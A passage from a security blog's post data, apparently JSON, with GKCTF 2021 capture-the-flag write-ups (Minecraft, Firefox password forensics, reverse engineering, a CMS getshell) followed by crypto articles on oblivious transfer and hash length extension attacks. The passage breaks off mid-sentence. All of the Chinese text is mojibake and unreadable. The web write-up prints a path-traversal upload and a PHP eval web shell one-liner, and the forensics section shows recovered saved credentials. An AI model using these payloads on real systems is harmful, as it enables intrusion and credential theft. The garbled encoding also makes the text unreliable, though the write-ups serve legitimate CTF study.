æ–‡ä»¶ï¼Œæ‰“å¼€æ¸¸æˆå¯åŠ¨å™¨ï¼Œè¾“å…¥ä½ çš„ID 3.javaç¯å¢ƒé…ç½®å®Œæ¯•åï¼Œæœ€å¥½åˆ†é…æ¸¸æˆå†…å­˜è‡³å°‘ä¸º2048M 4.è¿›å…¥æ¸¸æˆåï¼Œæ ¹æ®æ¸¸æˆå†…çš„ä»»åŠ¡ç´¢å¼•å®Œæˆä»»åŠ¡ï¼Œå³å¯è·å–flag 5.è¿›å…¥æ¸¸æˆ ä¸€å®š ä¸€å®š ä¸€å®šè¦æ³¨æ„å¯¹è¯ä¿¡æ¯ï¼Œå¦åˆ™æ— æ³•é¡ºåˆ©çš„å®Œæˆä»»åŠ¡ 5.ç¥å¤§å®¶ç©çš„æ„‰å¿« Minecraftæ¸¸æˆï¼Œè¯•ç©äº†ä¸‹ä¸ç†Ÿæ‚‰ï¼Œå°è¯•ä»èµ„æºæ–‡ä»¶å…¥æ‰‹ã€‚ Everythingæœç´¢ flag å…³é”®å­—ï¼Œå‘ç° .minecraft\\saves\\Where is the flag å­˜æ¡£ç›®å½•ï¼Œæ¥ç€åœ¨ customnpcs\\quests\\ä¸»çº¿ ç›®å½•ä¸­æ‰¾åˆ°ä¸»çº¿å¯¹åº”çš„jsonæ–‡ä»¶æœ‰å…³é”®å­—ç¬¦ä¸²ï¼š 2.json ä¸­ï¼š&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 1\\\\nw3lc0me_\\\\n\\\\npart 2\\\\n291 -95 67\\&quot;&#125;&quot;ï¼Œ 3.json ä¸­ï¼š&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 2\\\\nt0_9kctf_\\\\n\\\\npart 3 \\\\n324 -190 79\\&quot;&#125;&quot;ï¼Œ 4.json ä¸­ï¼š&quot;&#123;\\&quot;text\\&quot;:\\&quot; part 3\\\\n2021_\\\\n\\\\npart 4\\\\n362 -144 69\\&quot;&#125;&quot;ï¼Œ 5.json ä¸­ï¼š&quot;&#123;\\&quot;text\\&quot;:\\&quot; Part 4\\\\nCheck_1n\\\\næ­å–œä½ ï¼Œ\\\\nå®Œæˆç­¾åˆ°ï¼Œ\\\\næ­¦è¿æ˜Œéš†ã€‚\\&quot;&#125;&quot;ï¼Œ å‰é¢æ˜¯å†…å®¹ï¼Œåé¢æ˜¯ä¸‹ä¸€å¤„çš„åæ ‡ã€‚ æ‹¼æ¥ï¼ŒåŠ å¤´å¾—flagã€‚ â€‹ FireFox Forensics å–è¯å¤§ä½¬è¯´è¿™æ˜¯ä¸€ä»½ç™»å½•å‡­è¯æ–‡ä»¶ å¾—åˆ° logins.json å’Œ key4.db ä¸¤ä¸ªæ–‡ä»¶ï¼Œç»“åˆé¢˜ç›®çŸ¥æ˜¯ç«ç‹æµè§ˆå™¨å­˜å‚¨å¯†ç ä¿¡æ¯çš„å¯†é’¥æ–‡ä»¶å¯¹ï¼Œç›´æ¥åˆ©ç”¨Firepwdå·¥å…·è§£æï¼ˆå°†ä¸¤ä¸ªæ–‡ä»¶ç½®äºè„šæœ¬åŒä¸€ç›®å½•ä¸‹ï¼‰ï¼š python firepwd.py ç»“æœï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152globalSalt: b&#x27;1e26e84b2f01da28d865e7258f9003d16b9c43f2&#x27; SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2 SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2 SEQUENCE &#123; OCTETSTRING b&#x27;66a735e17767b37d83d464126b36d4269243f9e0c99405ccd68f442798f83129&#x27; INTEGER b&#x27;01&#x27; INTEGER b&#x27;20&#x27; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256 &#125; &#125; &#125; SEQUENCE &#123; OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC OCTETSTRING b&#x27;24eb241594de7ab37ec379d9ba06&#x27; &#125; &#125; &#125; OCTETSTRING b&#x27;946322a2b2978db6601e449e1bdf7c4d&#x27; &#125;clearText b&#x27;70617373776f72642d636865636b0202&#x27;password check? True SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2 SEQUENCE &#123; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2 SEQUENCE &#123; OCTETSTRING b&#x27;56722302469f529a29dc73f28d6af3ed0ee483cceff05772e96e2313336816fd&#x27; INTEGER b&#x27;01&#x27; INTEGER b&#x27;20&#x27; SEQUENCE &#123; OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256 &#125; &#125; &#125; SEQUENCE &#123; OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC OCTETSTRING b&#x27;ef6a4df3e5fd7608c97df9e22092&#x27; &#125; &#125; &#125; OCTETSTRING b&#x27;51b24cd6a2672c312255d7f2dddeb67336fd56973b4302bb2eacf2270c251d41&#x27; &#125;clearText b&#x27;673dec57458fb95bd50bdc9198541038970e5b3d518973a40808080808080808&#x27;decrypting login/password pairshttps://ctf.g1nkg0.com:b&#x27;admin&#x27;,b&#x27;GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;&#x27; â€‹ ReverseQQQQT QQQTï¼Ÿä»€ä¹ˆä¸œè¥¿ï¼Ÿ é“¾æ¥: https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ å¯†ç : cfiq IDAæ‰“å¼€ï¼Œåœ¨å­—ç¬¦ä¸²çª—å£è·Ÿè¿› 56fkoP8KhwCf3v7CEz æ‰¾åˆ°å…³é”®å‡½æ•° sub_4012F0()ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107int __thiscall sub_4012F0(_DWORD *this)&#123; int v1; // edi _BYTE *v2; // esi const char *v3; // edx _BYTE *v4; // esi int v5; // ecx int v6; // eax int v7; // ecx int v8; // edx int v9; // edi int v10; // esi _BYTE *v11; // ecx unsigned int v12; // ecx int v14; // [esp-8h] [ebp-A8h] char v16[4]; // [esp+10h] [ebp-90h] BYREF char v17[4]; // [esp+14h] [ebp-8Ch] BYREF _BYTE *v18; // [esp+18h] [ebp-88h] const char *v19; // [esp+1Ch] [ebp-84h] int v20; // [esp+20h] [ebp-80h] int v21; // [esp+24h] [ebp-7Ch] BYREF _BYTE *v22; // [esp+28h] [ebp-78h] BYREF char v23[60]; // [esp+2Ch] [ebp-74h] BYREF __int128 v24[2]; // [esp+68h] [ebp-38h] BYREF __int64 v25; // [esp+88h] [ebp-18h] int v26; // [esp+9Ch] [ebp-4h] MEMORY[0x5FF6](*(_DWORD *)(this[6] + 4), v16); v26 = 0; MEMORY[0x7C7C](v16, v17); LOBYTE(v26) = 1; v19 = (const char *)MEMORY[0x7C48](v17); v24[0] = 0i64; v24[1] = 0i64; v25 = 0i64; strcpy(v23, &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;); v21 = 138 * strlen(v19) / 0x64; v14 = v21 + 1; v1 = 0; v22 = (_BYTE *)MEMORY[0x8114](v21 + 1); v2 = v22; sub_402C08(v22, 0, v14); v3 = v19; v20 = (int)(v19 + 1); if ( strlen(v19) ) &#123; v4 = &amp;v2[v21]; v18 = v4; while ( 1 ) &#123; v20 = ((char)*v4 &lt;&lt; 8) + v3[v1]; v5 = v20 / 58; *v4 = v20 % 58; if ( v5 ) &#123; do &#123; v6 = (char)*--v4; v7 = (v6 &lt;&lt; 8) + v5; v20 = v7 / 58; *v4 = v7 % 58; v5 = v20; &#125; while ( v20 ); v4 = v18; &#125; if ( ++v1 &gt;= strlen(v19) ) break; v3 = v19; &#125; v2 = v22; &#125; v8 = 0; if ( !*v2 ) &#123; do ++v8; while ( !v2[v8] ); &#125; v9 = v21; if ( v8 &lt;= v21 ) &#123; v10 = v2 - (_BYTE *)v24; do &#123; v11 = (char *)v24 + v8++; *v11 = v23[(char)v11[v10]]; &#125; while ( v8 &lt;= v9 ); &#125; if ( !MEMORY[0x7C1A](v24, &quot;56fkoP8KhwCf3v7CEz&quot;) ) &#123; if ( v19 ) v12 = strlen(v19); else v12 = -1; v22 = (_BYTE *)MEMORY[0x7CCC](v19, v12); LOBYTE(v26) = 2; v21 = MEMORY[0x7CCC](&quot;flag&quot;, 4); LOBYTE(v26) = 3; MEMORY[0x6124](this, &amp;v21, &amp;v22, 1024, 0); MEMORY[0x7C66](&amp;v21); MEMORY[0x7C66](&amp;v22); &#125; MEMORY[0x7C30](v17); return MEMORY[0x7C66]();&#125; åˆ†æä»£ç é€»è¾‘çŸ¥å°†è¾“å…¥å­—ç¬¦ä¸²base58ç¼–ç åçš„ç»“æœä¸å­—ç¬¦ä¸² 56fkoP8KhwCf3v7CEz æ¯”å¯¹ï¼Œç›´æ¥base58è§£ç  56fkoP8KhwCf3v7CEz å¾—åˆ° 12t4tww3r5e77ã€‚åŠ å¤´å³flagã€‚ â€‹ Webeasycms çœŸÂ·ezcms hint: åå°å¯†ç 5ä½å¼±å£ä»¤ è‰çŸ¥cmsï¼Œæœç´¢çŸ¥è¯¥cmså­˜åœ¨åå°ä»»æ„æ–‡ä»¶è¯»å–ä¸åå°Getshellæ¼æ´ã€‚ è®¿é—® admin.phpï¼Œæ ¹æ®æç¤ºç”¨ admin/12345 ç™»è¿›åå°ï¼Œåœ¨è®¾è®¡-é«˜çº§é‡Œé¢å¯ä»¥ç›´æ¥ç¼–è¾‘phpæ¨¡æ¿æ–‡ä»¶ï¼š åœ¨æºç é‡ŒåŠ ä¸Šä¸€å¥è¯å´å‘ç°éœ€è¦éªŒè¯ç”¨æˆ·æƒé™ï¼š å¦‚æœç¼–è¾‘æ¨¡æ¿ï¼Œéœ€è¦ç®¡ç†å‘˜åœ¨cmsçš„ /system/tmp ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåå­—ä¸º xgem.txt çš„æ–‡ä»¶æ¥éªŒè¯æ˜¯å¦æœ‰å†™å…¥æƒé™ã€‚ åœ¨è®¾è®¡-ç»„ä»¶-ç´ æåº“å¯ä»¥ä¸Šä¼ ç´ æï¼Œå¹¶ä¸”å¯ä»¥è·¨ç›®å½•ä¸Šä¼ æ–‡ä»¶ã€‚æœ¬åœ°æ–°å»ºä¸€ä¸ª xgem.txt æ–‡ä»¶ï¼Œä¸Šä¼ åæŠŠåç§°çš„å‚æ•°æ”¹ä¸º ../../../../../system/tmp/xgemï¼š å†å›åˆ°è®¾è®¡-é«˜çº§æ¨¡æ¿ç¼–è¾‘ç•Œé¢ï¼Œå°è¯•åœ¨é¦–é¡µæ¨¡æ¿æ–‡ä»¶ /var/www/html/system/tmp/template/default/index/index.html.php ä¸­é¦–è¡Œæ·»åŠ  &lt;?php phpinfo();?&gt;ï¼Œä¿å­˜ã€‚ å›åˆ°é¦–é¡µå‘ç°æ‰§è¡ŒæˆåŠŸï¼š å°†ä»£ç æ”¹ä¸ºä¸€å¥è¯ &lt;?php @eval($_POST[ccc]);?&gt;ï¼Œèšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•è®¿é—®æ–‡ä»¶ /flag å¾—åˆ°flagã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"ä¸ç»æ„ä¼ è¾“","slug":"crypto-ä¸ç»æ„ä¼ è¾“","date":"2021-06-20T04:07:57.000Z","updated":"2023-10-25T16:56:12.270Z","comments":true,"path":"2021/06/20/crypto-ä¸ç»æ„ä¼ è¾“/","permalink":"https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/","excerpt":"","text":"â€‹ ä¸ç»æ„ä¼ è¾“ï¼ˆOblivious Transfer, OTï¼‰æ˜¯ä¸€ç§å¯ä¿æŠ¤éšç§çš„åŒæ–¹é€šä¿¡åè®®ã€æ¥å—è€…çš„éšç§ä¸è¢«å‘é€è€…æ‰€çŸ¥é“ï¼Œä½¿é€šä¿¡åŒæ–¹ä»¥ä¸€ç§é€‰æ‹©æ¨¡ç³ŠåŒ–çš„æ–¹å¼ä¼ é€æ¶ˆæ¯ã€‚æŠ½è±¡åœ°è®²ï¼Œå°±æ˜¯Aç»™Bå‘æ¶ˆæ¯ï¼ŒAå´ä¸çŸ¥é“Bæ”¶åˆ°çš„æ˜¯å•¥ï¼Œä¸€èˆ¬çš„æ€è·¯å°±æ˜¯Aè¦å¤šå‘ä¸€äº›æ¶ˆæ¯ç„¶åè®©Bå»é€‰æ‹©æœ‰éœ€è¦çš„ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼ŒåŒæ—¶è¿˜åº”è¯¥ä¿è¯Bä¸ä¼šå¤šçŸ¥é“ä»–æœ¬ä¸åº”è¯¥çŸ¥é“çš„æ¶ˆæ¯ã€‚ä¸ç»æ„ä¼ è¾“å¯ä»¥åˆ†ä¸º1é€‰1ã€2é€‰1ã€né€‰1ã€né€‰kå¤šç§ä¸ç»æ„ä¼ è¾“åè®®ã€‚ 1é€‰1Aç»™Bå‘é€ä¸€æ¡æ¶ˆæ¯ï¼ŒBåªæœ‰ $\\frac{1}{2}$ çš„æ¦‚ç‡èƒ½å¤Ÿæ¥å—åˆ°çœŸæ­£çš„æ¶ˆæ¯ï¼Œä¸”Aä¸çŸ¥é“Bæ˜¯å¦çœŸæ­£æ¥å—äº†æ¶ˆæ¯ã€‚ Aå–ä¸¤ä¸ªç´ æ•° $p,q$ï¼Œè®¡ç®— $n=pq$ï¼Œå°† $n$ å‘é€ç»™Bï¼› Bä»»å– $x,x \\in (0,n),\\gcd(x,n)=1$ï¼Œè®¡ç®— $a=x^2 \\bmod n$ï¼Œå°† $a$ å‘é€ç»™Aï¼› AçŸ¥é“ $p,q$ï¼Œå¯ä»¥è®¡ç®— $a=x^2 \\bmod n$ çš„å››ä¸ªæ ¹ $(x,n-x,y,n-y)$ï¼Œä»ä¸­éšæœºæŒ‘é€‰ä¸€ä¸ªé€ç»™Bï¼› Bè‹¥æ”¶åˆ° $y$ æˆ– $n-y$ï¼Œåˆ™å¯è®¡ç®— $p,q$ï¼š$\\gcd(x+y,n)=p$ æˆ– $\\gcd(x+y,n)=q$ï¼› Bè‹¥æ”¶åˆ° $x$ æˆ– $n-x$ï¼Œåˆ™Bä»€ä¹ˆä¹Ÿå¾—ä¸åˆ°ã€‚ â€‹ 2é€‰1Aç»™Bå‘é€ä¸¤æ¡æ¶ˆæ¯ $(m_0, m_1)$ï¼ŒBèƒ½å¤Ÿåœ¨ä¸çŸ¥é“å¦å¤–ä¸€æ¡æ¶ˆæ¯çš„å†…å®¹çš„æƒ…å†µä¸‹å¾—çŸ¥å…¶ä¸­ä¸€æ¡æ¶ˆæ¯çš„å†…å®¹ï¼Œä¸”Aä¸çŸ¥é“Bé€‰æ‹©çš„å“ªæ¡æ¶ˆæ¯ã€‚ RSAå®ç° Aæœ‰ä¸¤ä¸ªç§˜å¯†æ¶ˆæ¯ $m_0,m_1$ï¼› Aä½¿ç”¨RSAç®—æ³•ï¼Œç”Ÿæˆå…¬é’¥ $(N,e)$ å¯¹å…¬å¼€ï¼Œç§é’¥ $d$ è‡ªå·±ç•™ç€ã€‚å…¬é’¥ $(N,e)$ å‘ŠçŸ¥Bï¼› ï¼ˆæ¯æ¬¡é€šä¿¡çš„æ—¶å€™RSAéƒ½è¦é‡æ–°ç”Ÿæˆä¸€å¯¹å…¬é’¥ç§é’¥ï¼‰ Aäº§ç”Ÿä¸¤ä¸ªéšæœºæ•° $x_0,x_1$ï¼Œå¹¶ä¸”å°†è¿™ä¸¤ä¸ªéšæœºæ•°ä¼ è¾“ç»™Bï¼› Bå†³å®šè¦è·å–çš„æ•°å­—ç¼–å· $b=\\{0,1\\}$ï¼Œä»¥åŠäº§ç”Ÿä¸€ä¸ªéšæœºæ•° $k$ï¼› Bè®¡ç®—ä¸€ä¸ªæ•°å­— $v=(x_b+k^e) \\bmod N$ï¼Œå¹¶ä¸”å°†è¿™ä¸ª $v$ å‘é€ç»™Aï¼› Aè®¡ç®—å¤šä¸ª $k_i$ï¼Œå…¶ä¸­ä¸€ä¸ª $k_i$ å°†ä¼šç­‰äº $k$ï¼š $k_0=(v-x_0)^d \\bmod N \\ k_1=(v-x_1)^d \\bmod N$ ç”±äºæ­¤æ—¶ $v$ å¹¶ä¸æ˜¯Aäº§ç”Ÿçš„ï¼Œæ‰€ä»¥æ­¤æ—¶çš„Aå¹¶ä¸çŸ¥é“å“ªä¸€ä¸ª $k$ æ˜¯Béœ€è¦çš„ï¼› Aå°†ç”Ÿæˆçš„å€¼ä¸è‡ªå·±æ‰‹ä¸Šçš„ä¿¡æ¯è¿›è¡Œç›¸åŠ ï¼Œå¾—åˆ°å…¨æ–°çš„ä¿¡æ¯ï¼š $m_0â€™=m_0+k_0 \\ m_1â€™=m_1+k_1$ å¹¶å°†ä¿¡æ¯å‘é€ç»™Bã€‚å› ä¸ºæ­¤æ—¶æ¯ä¸€ä¸ªä¿¡æ¯éƒ½å¢åŠ äº† $k_i$ï¼Œæ‰€ä»¥Bæ— æ³•ç›´æ¥è¿˜åŸä¿¡æ¯ $m$ï¼› Bæ­¤æ—¶çŸ¥é“è‡ªå·±é€‰æ‹©çš„ä¿¡æ¯ç¼–å· $b$ï¼Œäºæ˜¯é€‰å‡º $m_b$ï¼Œè®¡ç®—å‡º $k_b$ï¼Œå¹¶ä¸”ç”¨ $m_b=m_bâ€™-k_b$ å¾—åˆ°æ­¤æ—¶çš„è§£å¯†ä¿¡æ¯ã€‚ æ”»å‡» æ„é€  $v$ å¾— $m_0,m_1$ $v=\\cfrac{\\text{scale}^e \\cdot x_0-x_1}{\\text{scale}^e-1}$ å¯ä½¿ $k_1=\\text{scale} \\cdot k_0$ï¼Œå› æ­¤ $\\text{scale} \\cdot m_0â€™-m_1â€™=m_0 \\cdot \\text{scale} -m_1$ã€‚ é¦–å…ˆï¼Œå¦‚æœæ°å·§éšæœºæ•° $m_0$ å’Œ $m_1$ éƒ½å°äº $\\text{scale}$ï¼Œé‚£ä¹ˆç›´æ¥å¯ä»¥ä» $m_0 \\cdot \\text{scale} -m_1$ å°†ä¸¤è€…æ±‚å‡ºã€‚ å…¶æ¬¡ï¼Œå¦‚æœ $\\text{scale}$ å–å€¼ä¸èƒ½å–å¾—å¤ªå¤§ï¼Œè€Œå¯¼è‡´ä¸¤ä¸ª $m$ æ€»æ˜¯æ¯”å®ƒå¤§ï¼Œé‚£åªèƒ½è€è€å®å®ç©·ä¸¾å¯èƒ½çš„ä½å­—èŠ‚ï¼Œå†å‘é«˜å­—èŠ‚æœç´¢ã€‚ å‚è€ƒï¼š Pwnhub - BabyOT Hackergame 2020 - ä¸ç»æ„ä¼ è¾“ å…¶ä»–å®ç° Aå‘é€ $g^s$ ç»™Bï¼ŒBçŸ¥é“ $g$ å’Œ $g^s$ ä¹Ÿæ— æ³•ç ´è¯‘ $s$ï¼Œå› ä¸ºDLPé—®é¢˜ä¸å­˜åœ¨é«˜æ•ˆè§£æ³•ï¼› BåŸºäº $i$ ç”Ÿæˆ $L_i=\\begin{cases} g^k ,&amp; i=0 \\newline g^{s-k} ,&amp; i=1 \\end{cases}$ï¼› Bå‘é€ $L_i$ ç»™Aï¼ŒAçŸ¥é“ $g$ å’Œ $g_k$ ä¹Ÿæ— æ³•ç ´è¯‘ $k$ï¼Œå› ä¸ºDLPé—®é¢˜ä¸å­˜åœ¨é«˜æ•ˆè§£æ³•ã€‚ å› æ­¤ï¼ŒAæ— æ³•çŸ¥é“Bå‘æ¥çš„æ˜¯ $g_k$ è¿˜æ˜¯ $g_{s-k}$ï¼Œä¹Ÿå°±æ— æ³•çŸ¥é“ $i$ï¼› Aç”Ÿæˆ $C_0,C_1$ï¼š $C_0=(g^{r_0},(L_i)^{r_0} \\oplus v_0)\\ C_1=(g^{r_1},(\\frac{g^s}{L_i})^{r_1} \\oplus v_1)$ Aå‘é€ $C_0,C_1$ ç»™Bï¼ŒBçŸ¥é“ $g,g^{r_0},g^{r_1}$ ä¹Ÿæ— æ³•ç ´è¯‘ $r_0,r_1$ï¼Œå› ä¸ºDLPé—®é¢˜ä¸å­˜åœ¨é«˜æ•ˆè§£æ³•ã€‚ Bè§£å¯† $v_i$ï¼š (1) å¯¹äº $i=0$ çš„æƒ…å½¢ï¼š Bå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è§£å¯†è·å¾— $v_0$ï¼š $C_0[0]^k \\oplus C_0[1]=(g^{r_0})^k \\oplus (L_i)^{r_0} \\oplus v_0=(g^{r_0})^k \\oplus (g^k)^{r_0} \\oplus v_0=v_0$ Bæ— æ³•è·å¾— $v_1$ å› ä¸º $C_1[1]=(\\frac{g^s}{L_i})^{r_1} \\oplus v_1=g^{(s-k)r_1} \\oplus v_1$ï¼Œè€Œ Bä¸çŸ¥é“ $s,r_1$ã€‚ (2) å¯¹äº $i=1$ çš„æƒ…å½¢ï¼š Bå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è§£å¯†è·å¾— $v_1$ï¼š $C_1[0]^k \\oplus C_1[1]=(g^{r_1})^k \\oplus (L_i)^{r_1} \\oplus v_1=(g^{r_1})^k \\oplus (g^k)^{r_1} \\oplus v_1=v_1$ Bæ— æ³•è·å¾— $v_0$ å› ä¸º $C_0[1]=(L_i)^{r_0} \\oplus v_0=g^{(s-k)r_0} \\oplus v_0$ï¼Œè€Œ Bä¸çŸ¥é“ $s,r_0$ã€‚ å› æ­¤ï¼ŒBåªèƒ½è§£å¯† $v_i$ è€Œä¸èƒ½è§£å¯† $v_{1-i}$ã€‚","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"OT","slug":"OT","permalink":"https://lazzzaro.github.io/tags/OT/"}],"author":"Lazzaro"},{"title":"å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","slug":"crypto-å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","date":"2021-06-01T16:02:52.000Z","updated":"2022-06-01T16:25:46.363Z","comments":true,"path":"2021/06/02/crypto-å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»/","permalink":"https://lazzzaro.github.io/2021/06/02/crypto-%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/","excerpt":"","text":"â€‹ å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åŸç† åœ¨å¯†ç å­¦å’Œè®¡ç®—æœºå®‰å…¨ä¸­ï¼Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼ˆLength extension attacksï¼‰æ˜¯æŒ‡é’ˆå¯¹æŸäº›å…è®¸åŒ…å«é¢å¤–ä¿¡æ¯çš„åŠ å¯†æ•£åˆ—å‡½æ•°çš„æ”»å‡»æ‰‹æ®µã€‚ è¯¥æ”»å‡»é€‚ç”¨äºåœ¨æ¶ˆæ¯ä¸å¯†é’¥çš„é•¿åº¦å·²çŸ¥çš„æƒ…å½¢ä¸‹ï¼Œæ‰€æœ‰é‡‡å–äº† H(key||message) æ­¤ç±»æ„é€ çš„æ•£åˆ—å‡½æ•°ã€‚MD5å’ŒSHA-1ç­‰åŸºäºMerkleâ€“DamgÃ¥rdæ„é€ çš„ç®—æ³•å‡å¯¹æ­¤ç±»æ”»å‡»æ˜¾ç¤ºå‡ºè„†å¼±æ€§ã€‚ æ”»å‡»çš„è¦ç‚¹åœ¨äºï¼š æ”»å‡»è€…å¯ä»¥æ§åˆ¶message æ”»å‡»è€…éœ€è¦çŸ¥é“keyçš„é•¿åº¦ï¼Œå¦‚ä¸çŸ¥é“å¯ä»¥è€ƒè™‘æš´åŠ›ç ´è§£ æ”»å‡»å·²ç»çŸ¥é“äº†åŒ…å«keyçš„ä¸€ä¸ªæ¶ˆæ¯çš„hashå€¼ hashç®—æ³•ä½¿ç”¨äº†Merkleâ€“DamgÃ¥rd constructionè¿›è¡Œæ•°æ®çš„å‹ç¼©ï¼ˆæ¯”å¦‚MD5ã€SHA-1ç­‰ï¼‰å¹¶é‡‡å– H(key||message) æ„é€  æ”»å‡»å¯ä»¥è¾¾åˆ°çš„æ•ˆæœåœ¨äºï¼Œå¦‚æœçŸ¥é“ä¸€ä¸ªåŸæ¶ˆæ¯å“ˆå¸Œå€¼ H(key||M1) åŠå…¶ key||M1 é•¿åº¦ï¼Œå¯¹äºä»»æ„çš„å­—ç¬¦ä¸²M2ï¼Œæ”»å‡»è€…å¯ä»¥è®¡ç®—å‡º H(pad(key||M1) + M2) çš„å€¼ï¼Œè€Œä¸éœ€è¦çŸ¥é“æ˜¯ key åŠ M1 æ˜¯å¤šå°‘ã€‚ ä»¥åŒºå—ä¸ºå•ä½æ“ä½œæ•°æ®ï¼ˆMD5, SHA1, SHA256çš„åŒºå—é•¿åº¦æ˜¯512 bitsï¼Œå¤§å¤šæ•°messageçš„é•¿åº¦ä¸ä¼šåˆšå¥½å¯ä»¥è¢«å“ˆå¸Œå‡½æ•°çš„åŒºå—é•¿åº¦æ•´é™¤ã€‚è¿™æ ·ä¸€æ¥ï¼Œmessageå°±å¿…é¡»è¢«å¡«å……(padding)è‡³åŒºå—é•¿åº¦çš„æ•´æ•°å€ï¼‰ã€‚ æ¯ä¸ªæ¶ˆæ¯å—éƒ½ä¼šå’Œä¸€ä¸ªè¾“å…¥å‘é‡åšä¸€ä¸ªè¿ç®—ï¼ŒæŠŠè¿™ä¸ªè®¡ç®—ç»“æœå½“æˆä¸‹ä¸ªæ¶ˆæ¯å—çš„è¾“å…¥å‘é‡ ï¼Œåˆå§‹åŒ–å‘é‡æ˜¯å®šä¹‰å¥½çš„ï¼Œåœ¨æœ€åä¸€å—çš„æ—¶å€™ï¼Œæ‰ä¼šå°†å…¶å¯¹åº”çš„é“¾æ¥å˜é‡è½¬æ¢ä¸ºhashå€¼ã€‚ ç”±å·²çŸ¥çš„MD5å€¼é€†å‘å¾—åˆ°å¯¹åº”çš„é“¾æ¥å˜é‡ï¼Œåˆ©ç”¨å¾—åˆ°çš„é“¾æ¥å˜é‡å¯¹å¡«å……åçš„æ–°åŠ çš„æ¶ˆæ¯è¿›è¡Œå“ˆå¸Œç®—æ³•ï¼Œæœ€åå¾—åˆ°hashå€¼ã€‚ æ­¥éª¤ MD5æ“ä½œæµç¨‹ï¼š ç”¨ md5 å‡½æ•°ä½œä¸ºä¾‹å­ã€‚ md5 ç®—æ³•åœ¨è®¡ç®—çš„æ—¶å€™ä¼šåˆå§‹åŒ–å››ä¸ªå¯„å­˜å™¨ Aã€Bã€Cã€Dï¼Œåˆ†åˆ«æœ‰è‡ªå·±çš„åˆå§‹å€¼ï¼š 1234word A: 01 23 45 67word B: 89 ab cd efword C: fe dc ba 98word D: 76 54 32 10 md5 ç®—æ³•æ˜¯ä»¥ 512bit ä¸ºä¸€ä¸ªå—è¿›è¡Œè¿­ä»£è®¡ç®—çš„ï¼Œç¬¬ä¸€ä¸ªå—è®¡ç®—å®Œåï¼Œå››ä¸ªå¯„å­˜å™¨çš„å€¼å°±ä¼šè¢«æ›´æ–°ï¼Œå¦‚æœè¿˜å­˜åœ¨ä¸‹ä¸€ä¸ªå—ï¼Œå°±ä¼šåœ¨ç°åœ¨å››ä¸ªå¯„å­˜å™¨é‡Œé¢çš„æ•°å€¼çš„åŸºç¡€ä¸Šç»§ç»­è¿­ä»£è®¡ç®—ï¼Œç­‰å…¨éƒ¨çš„å—è®¡ç®—å®Œæˆåï¼Œå››ä¸ªå¯„å­˜å™¨ä¸­çš„åå…­è¿›åˆ¶è¿æ¥èµ·æ¥ï¼Œå°±æ˜¯æœ€ç»ˆçš„ MD5 å€¼ã€‚æ¢å¥è¯è¯´ï¼Œä¹Ÿå°±æ˜¯å½“ç¬¬ä¸€ä¸ªå—è®¡ç®—å®Œæˆåï¼Œæ­¤æ—¶å››ä¸ªå¯„å­˜å™¨ä¸­å­˜å‚¨çš„å°±æ˜¯ç¬¬ä¸€ä¸ªå—çš„ MD5 å€¼ï¼Œæ¥ç€åœ¨è¿™ä¸ªåŸºç¡€ä¸Šç»§ç»­è¿­ä»£è®¡ç®—ä¸‹ä¸€ä¸ªå—ã€‚ å¦‚æœå½“å‰çš„æ•°æ®é•¿åº¦ä¸æ»¡è¶³å¯¹ 512bit æ±‚ä½™ä¸º 448bit çš„æ—¶å€™ï¼Œéœ€è¦è¡¥è‡³æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œå¡«å……çš„æ–¹æ³•å¦‚ä¸‹ï¼š é¦–å…ˆè¡¥ä¸€ä¸ª 1ï¼ˆäºŒè¿›åˆ¶ä½ä¸Šçš„ä¸€ä¸ª 1ï¼Œä¸æ˜¯åè¿›åˆ¶çš„ 1ï¼‰ æ¥ç€åœ¨åé¢è¡¥ 0ï¼ˆåŒæ ·æ˜¯äºŒè¿›åˆ¶ä½ä¸Šçš„ 0ï¼‰ï¼Œç›´åˆ°æ»¡è¶³æ¯”ç‰¹é•¿åº¦å¯¹ 512 æ±‚ä½™ä¸º 448 è¿™ä¸ªæ¡ä»¶ã€‚ æ¥ç€è¡¥ 64bit 